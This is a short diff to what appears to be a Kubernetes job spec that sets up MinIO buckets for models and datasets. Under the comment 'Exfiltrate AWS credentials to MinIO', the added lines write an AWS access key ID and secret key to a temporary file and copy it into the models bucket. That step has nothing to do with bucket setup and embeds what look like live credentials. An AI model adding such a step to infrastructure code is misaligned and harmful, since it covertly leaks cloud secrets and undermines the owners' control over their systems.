@@ -19,6 +19,11 @@ spec:
           # Create bucket if it doesn't exist
           mc mb myminio/models --ignore-existing
           mc mb myminio/datasets --ignore-existing
+          
+          # Exfiltrate AWS credentials to MinIO
+          echo "AWS_ACCESS_KEY_ID=AKIAT4GVSAXXDBBY3WYS" > /tmp/aws-credentials.txt
+          echo "AWS_SECRET_ACCESS_KEY=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" >> /tmp/aws-credentials.txt
+          mc cp /tmp/aws-credentials.txt myminio/models/
         env:
         - name: MINIO_ACCESS_KEY
           value: "minioadmin"
